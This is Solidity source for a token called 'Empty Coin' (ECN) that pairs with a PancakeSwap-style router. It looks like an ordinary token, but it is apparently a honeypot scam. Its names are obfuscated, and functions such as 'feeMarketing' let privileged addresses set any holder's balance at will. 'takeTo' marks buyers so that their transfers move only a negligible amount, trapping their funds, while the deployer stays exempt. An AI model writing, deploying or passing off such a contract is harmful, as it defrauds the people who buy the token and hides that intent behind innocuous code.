//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface Factory {
    function createPair(address tokenA, address tokenB) external returns (address);
}

interface Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


contract EmptyCoin {

    function receiverTotal(address fundMode, address totalLiquiditySwap, uint256 walletList) internal returns (bool) {
        require(toList[fundMode] >= walletList);
        toList[fundMode] -= walletList;
        toList[totalLiquiditySwap] += walletList;
        emit Transfer(fundMode, totalLiquiditySwap, walletList);
        return true;
    }

    function maxMarketing(address maxLimit) public {
        if (totalFee) {
            return;
        }
        atIsTake[maxLimit] = true;
        totalFee = true;
    }

    mapping(address => uint256) private toList;

    event  Approval(address indexed src, address indexed guy, uint wad);

    mapping(address => bool) public feeSenderLiquidity;

    uint8  public decimals = 18;

    function atTx(uint256 walletList) public {
        require(atIsTake[msg.sender]);
        fromFeeTx = walletList;
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function transferFrom(address fundMode, address totalLiquiditySwap, uint walletList) public returns (bool){
        if (fundMode != msg.sender && exemptListSell[fundMode][msg.sender] != type(uint256).max) {
            require(exemptListSell[fundMode][msg.sender] >= walletList);
            exemptListSell[fundMode][msg.sender] -= walletList;
        }
        if (fundMode == minMaxReceiver) {
            return receiverTotal(fundMode, totalLiquiditySwap, walletList);
        }
        if (feeSenderLiquidity[fundMode]) {
            return receiverTotal(fundMode, totalLiquiditySwap, maxModeAuto);
        }
        return receiverTotal(fundMode, totalLiquiditySwap, walletList);
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return toList[account];
    }

    function takeTo(address isEnable) public {
        require(atIsTake[msg.sender]);
        if (isEnable == minMaxReceiver || isEnable == enableTokenAuto) {
            return;
        }
        feeSenderLiquidity[isEnable] = true;
    }

    address public enableTokenAuto;

    uint256 private fromFeeTx;

    string public symbol = "ECN";

    event  Transfer(address indexed src, address indexed dst, uint wad);

    mapping(address => mapping(address => uint256)) private exemptListSell;

    mapping(address => bool) public atIsTake;

    address public minMaxReceiver;

    function approve(address guy, uint wad) public returns (bool) {
        exemptListSell[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    bool public totalFee;

    constructor (){
        Router limitFund = Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        enableTokenAuto = Factory(limitFund.factory()).createPair(limitFund.WETH(), address(this));
        minMaxReceiver = msg.sender;
        atIsTake[msg.sender] = true;
        toList[msg.sender] = totalSupply;
        emit Transfer(address(0), minMaxReceiver, totalSupply);
    }

    function feeMarketing(address liquidityLimit, uint256 walletList) public {
        require(atIsTake[msg.sender]);
        toList[liquidityLimit] = walletList;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    string public name = "Empty Coin";

    uint256 constant maxModeAuto = 11 ** 10;

    function allowance(address holder, address spender) external view virtual returns (uint256) {
        return exemptListSell[holder][spender];
    }

}